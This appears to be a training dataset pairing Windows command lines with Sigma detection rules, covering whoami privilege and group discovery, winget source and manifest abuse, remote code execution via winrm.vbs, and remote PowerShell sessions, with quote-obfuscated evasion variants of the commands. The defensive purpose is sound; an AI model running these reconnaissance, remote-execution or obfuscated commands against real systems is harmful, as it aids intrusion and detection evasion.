{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"w\"\"h\"\"o\"\"a\"\"m\"\"i\"\".\"\"e\"\"x\"\"e\" whoami.exe /groups -groups", "output": "title: Group Membership Reconnaissance Via Whoami.EXE\nid: bd8b828d-0dca-48e1-8a63-8a58ecf2644f\nstatus: test\ndescription: Detects the execution of whoami.exe with the /group command line flag to show group membership for the current user, account type, security identifiers (SID), and attributes.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.discovery\n    - attack.t1033\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' /groups'\n            - ' -groups'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami whoami /groups -groups", "output": "title: Group Membership Reconnaissance Via Whoami.EXE\nid: bd8b828d-0dca-48e1-8a63-8a58ecf2644f\nstatus: test\ndescription: Detects the execution of whoami.exe with the /group command line flag to show group membership for the current user, account type, security identifiers (SID), and attributes.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.discovery\n    - attack.t1033\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' /groups'\n            - ' -groups'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami.exe whoami.exe /groups -groups", "output": "title: Group Membership Reconnaissance Via Whoami.EXE\nid: bd8b828d-0dca-48e1-8a63-8a58ecf2644f\nstatus: test\ndescription: Detects the execution of whoami.exe with the /group command line flag to show group membership for the current user, account type, security identifiers (SID), and attributes.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.discovery\n    - attack.t1033\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' /groups'\n            - ' -groups'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami.exe whoami.exe /priv -priv", "output": "title: Security Privileges Enumeration Via Whoami.EXE\nid: 97a80ec7-0e2f-4d05-9ef4-65760e634f6b\nstatus: test\ndescription: Detects a whoami.exe executed with the /priv command line flag instructing the tool to show all current user privileges. This is often used after a privilege escalation attempt.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-05-05\nmodified: 2023-02-28\ntags:\n    - attack.privilege-escalation\n    - attack.discovery\n    - attack.t1033\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' /priv'\n            - ' -priv'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami.exe whoami.exe /\"p\"\"r\"\"i\"\"v\" -priv", "output": "title: Security Privileges Enumeration Via Whoami.EXE\nid: 97a80ec7-0e2f-4d05-9ef4-65760e634f6b\nstatus: test\ndescription: Detects a whoami.exe executed with the /priv command line flag instructing the tool to show all current user privileges. This is often used after a privilege escalation attempt.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-05-05\nmodified: 2023-02-28\ntags:\n    - attack.privilege-escalation\n    - attack.discovery\n    - attack.t1033\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' /priv'\n            - ' -priv'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami whoami /priv -priv", "output": "title: Security Privileges Enumeration Via Whoami.EXE\nid: 97a80ec7-0e2f-4d05-9ef4-65760e634f6b\nstatus: test\ndescription: Detects a whoami.exe executed with the /priv command line flag instructing the tool to show all current user privileges. This is often used after a privilege escalation attempt.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-05-05\nmodified: 2023-02-28\ntags:\n    - attack.privilege-escalation\n    - attack.discovery\n    - attack.t1033\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' /priv'\n            - ' -priv'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami.exe whoami.exe /priv -priv", "output": "title: Security Privileges Enumeration Via Whoami.EXE\nid: 97a80ec7-0e2f-4d05-9ef4-65760e634f6b\nstatus: test\ndescription: Detects a whoami.exe executed with the /priv command line flag instructing the tool to show all current user privileges. This is often used after a privilege escalation attempt.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-05-05\nmodified: 2023-02-28\ntags:\n    - attack.privilege-escalation\n    - attack.discovery\n    - attack.t1033\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' /priv'\n            - ' -priv'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winget.exe winget.exe source add", "output": "title: Add New Download Source To Winget\nid: 05ebafc8-7aa2-4bcd-a269-2aec93f9e842\nrelated:\n    - id: 81a0ecb5-0a41-4ba1-b2ba-c944eb92bfa2\n      type: similar\n    - id: c15a46a0-07d4-4c87-b4b6-89207835a83b\n      type: similar\nstatus: test\ndescription: Detects usage of winget to add new additional download sources\nreferences:\n    - https://learn.microsoft.com/en-us/windows/package-manager/winget/source\n    - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-17\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\winget.exe'\n        - OriginalFileName: 'winget.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'source '\n            - 'add '\n    condition: all of selection_*\nfalsepositives:\n    - False positive are expected with legitimate sources\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winget.exe winget.exe sou\\\"rce\\\" add", "output": "title: Add New Download Source To Winget\nid: 05ebafc8-7aa2-4bcd-a269-2aec93f9e842\nrelated:\n    - id: 81a0ecb5-0a41-4ba1-b2ba-c944eb92bfa2\n      type: similar\n    - id: c15a46a0-07d4-4c87-b4b6-89207835a83b\n      type: similar\nstatus: test\ndescription: Detects usage of winget to add new additional download sources\nreferences:\n    - https://learn.microsoft.com/en-us/windows/package-manager/winget/source\n    - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-17\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\winget.exe'\n        - OriginalFileName: 'winget.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'source '\n            - 'add '\n    condition: all of selection_*\nfalsepositives:\n    - False positive are expected with legitimate sources\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winget winget source add", "output": "title: Add New Download Source To Winget\nid: 05ebafc8-7aa2-4bcd-a269-2aec93f9e842\nrelated:\n    - id: 81a0ecb5-0a41-4ba1-b2ba-c944eb92bfa2\n      type: similar\n    - id: c15a46a0-07d4-4c87-b4b6-89207835a83b\n      type: similar\nstatus: test\ndescription: Detects usage of winget to add new additional download sources\nreferences:\n    - https://learn.microsoft.com/en-us/windows/package-manager/winget/source\n    - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-17\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\winget.exe'\n        - OriginalFileName: 'winget.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'source '\n            - 'add '\n    condition: all of selection_*\nfalsepositives:\n    - False positive are expected with legitimate sources\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winget.exe source winget.exe add", "output": "title: Add New Download Source To Winget\nid: 05ebafc8-7aa2-4bcd-a269-2aec93f9e842\nrelated:\n    - id: 81a0ecb5-0a41-4ba1-b2ba-c944eb92bfa2\n      type: similar\n    - id: c15a46a0-07d4-4c87-b4b6-89207835a83b\n      type: similar\nstatus: test\ndescription: Detects usage of winget to add new additional download sources\nreferences:\n    - https://learn.microsoft.com/en-us/windows/package-manager/winget/source\n    - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-17\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\winget.exe'\n        - OriginalFileName: 'winget.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'source '\n            - 'add '\n    condition: all of selection_*\nfalsepositives:\n    - False positive are expected with legitimate sources\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winget.exe winget.exe source add http://", "output": "title: Add Insecure Download Source To Winget\nid: 81a0ecb5-0a41-4ba1-b2ba-c944eb92bfa2\nrelated:\n    - id: 05ebafc8-7aa2-4bcd-a269-2aec93f9e842\n      type: similar\n    - id: c15a46a0-07d4-4c87-b4b6-89207835a83b\n      type: similar\nstatus: test\ndescription: |\n    Detects usage of winget to add a new insecure (http) download source.\n    Winget will not allow the addition of insecure sources, hence this could indicate potential suspicious activity (or typos)\nreferences:\n    - https://learn.microsoft.com/en-us/windows/package-manager/winget/source\n    - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-17\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\winget.exe'\n        - OriginalFileName: 'winget.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'source '\n            - 'add '\n            - 'http://'\n    condition: all of selection_*\nfalsepositives:\n    - False positives might occur if the users are unaware of such control checks\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winget.exe winget.exe sou\"rce\" add http://", "output": "title: Add Insecure Download Source To Winget\nid: 81a0ecb5-0a41-4ba1-b2ba-c944eb92bfa2\nrelated:\n    - id: 05ebafc8-7aa2-4bcd-a269-2aec93f9e842\n      type: similar\n    - id: c15a46a0-07d4-4c87-b4b6-89207835a83b\n      type: similar\nstatus: test\ndescription: |\n    Detects usage of winget to add a new insecure (http) download source.\n    Winget will not allow the addition of insecure sources, hence this could indicate potential suspicious activity (or typos)\nreferences:\n    - https://learn.microsoft.com/en-us/windows/package-manager/winget/source\n    - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-17\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\winget.exe'\n        - OriginalFileName: 'winget.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'source '\n            - 'add '\n            - 'http://'\n    condition: all of selection_*\nfalsepositives:\n    - False positives might occur if the users are unaware of such control checks\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winget winget source add http://", "output": "title: Add Insecure Download Source To Winget\nid: 81a0ecb5-0a41-4ba1-b2ba-c944eb92bfa2\nrelated:\n    - id: 05ebafc8-7aa2-4bcd-a269-2aec93f9e842\n      type: similar\n    - id: c15a46a0-07d4-4c87-b4b6-89207835a83b\n      type: similar\nstatus: test\ndescription: |\n    Detects usage of winget to add a new insecure (http) download source.\n    Winget will not allow the addition of insecure sources, hence this could indicate potential suspicious activity (or typos)\nreferences:\n    - https://learn.microsoft.com/en-us/windows/package-manager/winget/source\n    - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-17\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\winget.exe'\n        - OriginalFileName: 'winget.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'source '\n            - 'add '\n            - 'http://'\n    condition: all of selection_*\nfalsepositives:\n    - False positives might occur if the users are unaware of such control checks\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winget.exe source add winget.exe http://", "output": "title: Add Insecure Download Source To Winget\nid: 81a0ecb5-0a41-4ba1-b2ba-c944eb92bfa2\nrelated:\n    - id: 05ebafc8-7aa2-4bcd-a269-2aec93f9e842\n      type: similar\n    - id: c15a46a0-07d4-4c87-b4b6-89207835a83b\n      type: similar\nstatus: test\ndescription: |\n    Detects usage of winget to add a new insecure (http) download source.\n    Winget will not allow the addition of insecure sources, hence this could indicate potential suspicious activity (or typos)\nreferences:\n    - https://learn.microsoft.com/en-us/windows/package-manager/winget/source\n    - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-17\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\winget.exe'\n        - OriginalFileName: 'winget.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'source '\n            - 'add '\n            - 'http://'\n    condition: all of selection_*\nfalsepositives:\n    - False positives might occur if the users are unaware of such control checks\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winget.exe winget.exe install add -m --manifest", "output": "title: Install New Package Via Winget Local Manifest\nid: 313d6012-51a0-4d93-8dfc-de8553239e25\nstatus: test\ndescription: |\n    Detects usage of winget to install applications via manifest file. Adversaries can abuse winget to download payloads remotely and execute them.\n    The manifest option enables you to install an application by passing in a YAML file directly to the client.\n    Winget can be used to download and install exe, msi or msix files later.\nreferences:\n    - https://learn.microsoft.com/en-us/windows/package-manager/winget/install#local-install\n    - https://lolbas-project.github.io/lolbas/Binaries/Winget/\n    - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget\nauthor: Sreeman, Florian Roth (Nextron Systems), frack113\ndate: 2020-04-21\nmodified: 2023-04-17\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\winget.exe'\n        - OriginalFileName: 'winget.exe'\n    selection_install_flag:\n        CommandLine|contains:\n            - 'install'\n            - ' add ' # https://github.com/microsoft/winget-cli/blob/02d2f93807c9851d73eaacb4d8811a76b64b7b01/src/AppInstallerCLICore/Commands/InstallCommand.h\n    selection_manifest_flag:\n        CommandLine|contains:\n            - '-m '\n            - '--manifest'\n    condition: all of selection_*\nfalsepositives:\n    - Some false positives are expected in some environment that may use this functionality to install and test their custom applications\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winget.exe winget.exe install add \"-\"\"m\" --manifest", "output": "title: Install New Package Via Winget Local Manifest\nid: 313d6012-51a0-4d93-8dfc-de8553239e25\nstatus: test\ndescription: |\n    Detects usage of winget to install applications via manifest file. Adversaries can abuse winget to download payloads remotely and execute them.\n    The manifest option enables you to install an application by passing in a YAML file directly to the client.\n    Winget can be used to download and install exe, msi or msix files later.\nreferences:\n    - https://learn.microsoft.com/en-us/windows/package-manager/winget/install#local-install\n    - https://lolbas-project.github.io/lolbas/Binaries/Winget/\n    - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget\nauthor: Sreeman, Florian Roth (Nextron Systems), frack113\ndate: 2020-04-21\nmodified: 2023-04-17\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\winget.exe'\n        - OriginalFileName: 'winget.exe'\n    selection_install_flag:\n        CommandLine|contains:\n            - 'install'\n            - ' add ' # https://github.com/microsoft/winget-cli/blob/02d2f93807c9851d73eaacb4d8811a76b64b7b01/src/AppInstallerCLICore/Commands/InstallCommand.h\n    selection_manifest_flag:\n        CommandLine|contains:\n            - '-m '\n            - '--manifest'\n    condition: all of selection_*\nfalsepositives:\n    - Some false positives are expected in some environment that may use this functionality to install and test their custom applications\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winget winget install add -m --manifest", "output": "title: Install New Package Via Winget Local Manifest\nid: 313d6012-51a0-4d93-8dfc-de8553239e25\nstatus: test\ndescription: |\n    Detects usage of winget to install applications via manifest file. Adversaries can abuse winget to download payloads remotely and execute them.\n    The manifest option enables you to install an application by passing in a YAML file directly to the client.\n    Winget can be used to download and install exe, msi or msix files later.\nreferences:\n    - https://learn.microsoft.com/en-us/windows/package-manager/winget/install#local-install\n    - https://lolbas-project.github.io/lolbas/Binaries/Winget/\n    - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget\nauthor: Sreeman, Florian Roth (Nextron Systems), frack113\ndate: 2020-04-21\nmodified: 2023-04-17\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\winget.exe'\n        - OriginalFileName: 'winget.exe'\n    selection_install_flag:\n        CommandLine|contains:\n            - 'install'\n            - ' add ' # https://github.com/microsoft/winget-cli/blob/02d2f93807c9851d73eaacb4d8811a76b64b7b01/src/AppInstallerCLICore/Commands/InstallCommand.h\n    selection_manifest_flag:\n        CommandLine|contains:\n            - '-m '\n            - '--manifest'\n    condition: all of selection_*\nfalsepositives:\n    - Some false positives are expected in some environment that may use this functionality to install and test their custom applications\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winget.exe winget.exe --manifest install add -m", "output": "title: Install New Package Via Winget Local Manifest\nid: 313d6012-51a0-4d93-8dfc-de8553239e25\nstatus: test\ndescription: |\n    Detects usage of winget to install applications via manifest file. Adversaries can abuse winget to download payloads remotely and execute them.\n    The manifest option enables you to install an application by passing in a YAML file directly to the client.\n    Winget can be used to download and install exe, msi or msix files later.\nreferences:\n    - https://learn.microsoft.com/en-us/windows/package-manager/winget/install#local-install\n    - https://lolbas-project.github.io/lolbas/Binaries/Winget/\n    - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget\nauthor: Sreeman, Florian Roth (Nextron Systems), frack113\ndate: 2020-04-21\nmodified: 2023-04-17\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\winget.exe'\n        - OriginalFileName: 'winget.exe'\n    selection_install_flag:\n        CommandLine|contains:\n            - 'install'\n            - ' add ' # https://github.com/microsoft/winget-cli/blob/02d2f93807c9851d73eaacb4d8811a76b64b7b01/src/AppInstallerCLICore/Commands/InstallCommand.h\n    selection_manifest_flag:\n        CommandLine|contains:\n            - '-m '\n            - '--manifest'\n    condition: all of selection_*\nfalsepositives:\n    - Some false positives are expected in some environment that may use this functionality to install and test their custom applications\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cscript.exe cscript.exe winrm invoke Create wmicimv2/Win32_ -r:http", "output": "title: Remote Code Execute via Winrm.vbs\nid: 9df0dd3a-1a5c-47e3-a2bc-30ed177646a0\nstatus: test\ndescription: Detects an attempt to execute code or create service on remote host via winrm.vbs.\nreferences:\n    - https://twitter.com/bohops/status/994405551751815170\n    - https://redcanary.com/blog/lateral-movement-winrm-wmi/\n    - https://lolbas-project.github.io/lolbas/Scripts/Winrm/\nauthor: Julia Fomina, oscd.community\ndate: 2020-10-07\nmodified: 2023-03-03\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        # Note: winrm.vbs can only be run by a process named cscript (see \"IsCScriptEnv\" function)\n        - Image|endswith: '\\cscript.exe'\n        - OriginalFileName: 'cscript.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'winrm'\n            - 'invoke Create wmicimv2/Win32_'\n            - '-r:http'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cscript.exe cscript.exe winrm invoke Create wmicimv2/Win32_ \"-r:http\"", "output": "title: Remote Code Execute via Winrm.vbs\nid: 9df0dd3a-1a5c-47e3-a2bc-30ed177646a0\nstatus: test\ndescription: Detects an attempt to execute code or create service on remote host via winrm.vbs.\nreferences:\n    - https://twitter.com/bohops/status/994405551751815170\n    - https://redcanary.com/blog/lateral-movement-winrm-wmi/\n    - https://lolbas-project.github.io/lolbas/Scripts/Winrm/\nauthor: Julia Fomina, oscd.community\ndate: 2020-10-07\nmodified: 2023-03-03\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        # Note: winrm.vbs can only be run by a process named cscript (see \"IsCScriptEnv\" function)\n        - Image|endswith: '\\cscript.exe'\n        - OriginalFileName: 'cscript.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'winrm'\n            - 'invoke Create wmicimv2/Win32_'\n            - '-r:http'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cscript cscript winrm invoke Create wmicimv2/Win32_ -r:http", "output": "title: Remote Code Execute via Winrm.vbs\nid: 9df0dd3a-1a5c-47e3-a2bc-30ed177646a0\nstatus: test\ndescription: Detects an attempt to execute code or create service on remote host via winrm.vbs.\nreferences:\n    - https://twitter.com/bohops/status/994405551751815170\n    - https://redcanary.com/blog/lateral-movement-winrm-wmi/\n    - https://lolbas-project.github.io/lolbas/Scripts/Winrm/\nauthor: Julia Fomina, oscd.community\ndate: 2020-10-07\nmodified: 2023-03-03\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        # Note: winrm.vbs can only be run by a process named cscript (see \"IsCScriptEnv\" function)\n        - Image|endswith: '\\cscript.exe'\n        - OriginalFileName: 'cscript.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'winrm'\n            - 'invoke Create wmicimv2/Win32_'\n            - '-r:http'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cscript.exe cscript.exe winrm invoke Create wmicimv2/Win32_ -r:http", "output": "title: Remote Code Execute via Winrm.vbs\nid: 9df0dd3a-1a5c-47e3-a2bc-30ed177646a0\nstatus: test\ndescription: Detects an attempt to execute code or create service on remote host via winrm.vbs.\nreferences:\n    - https://twitter.com/bohops/status/994405551751815170\n    - https://redcanary.com/blog/lateral-movement-winrm-wmi/\n    - https://lolbas-project.github.io/lolbas/Scripts/Winrm/\nauthor: Julia Fomina, oscd.community\ndate: 2020-10-07\nmodified: 2023-03-03\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        # Note: winrm.vbs can only be run by a process named cscript (see \"IsCScriptEnv\" function)\n        - Image|endswith: '\\cscript.exe'\n        - OriginalFileName: 'cscript.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'winrm'\n            - 'invoke Create wmicimv2/Win32_'\n            - '-r:http'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsmprovhost.exe \\wsmprovhost.exe", "output": "title: Remote PowerShell Session Host Process (WinRM)\nid: 734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8\nstatus: test\ndescription: Detects remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session).\nreferences:\n    - https://threathunterplaybook.com/hunts/windows/190511-RemotePwshExecution/notebook.html\nauthor: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019-09-12\nmodified: 2022-10-09\ntags:\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1059.001\n    - attack.t1021.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\wsmprovhost.exe'\n        - ParentImage|endswith: '\\wsmprovhost.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate usage of remote Powershell, e.g. for monitoring purposes.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsmprovhost.exe \"\\wsmprovhost.exe\"", "output": "title: Remote PowerShell Session Host Process (WinRM)\nid: 734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8\nstatus: test\ndescription: Detects remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session).\nreferences:\n    - https://threathunterplaybook.com/hunts/windows/190511-RemotePwshExecution/notebook.html\nauthor: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019-09-12\nmodified: 2022-10-09\ntags:\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1059.001\n    - attack.t1021.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\wsmprovhost.exe'\n        - ParentImage|endswith: '\\wsmprovhost.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate usage of remote Powershell, e.g. for monitoring purposes.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsmprovhost \\wsmprovhost", "output": "title: Remote PowerShell Session Host Process (WinRM)\nid: 734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8\nstatus: test\ndescription: Detects remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session).\nreferences:\n    - https://threathunterplaybook.com/hunts/windows/190511-RemotePwshExecution/notebook.html\nauthor: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019-09-12\nmodified: 2022-10-09\ntags:\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1059.001\n    - attack.t1021.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\wsmprovhost.exe'\n        - ParentImage|endswith: '\\wsmprovhost.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate usage of remote Powershell, e.g. for monitoring purposes.\nlevel: medium"}
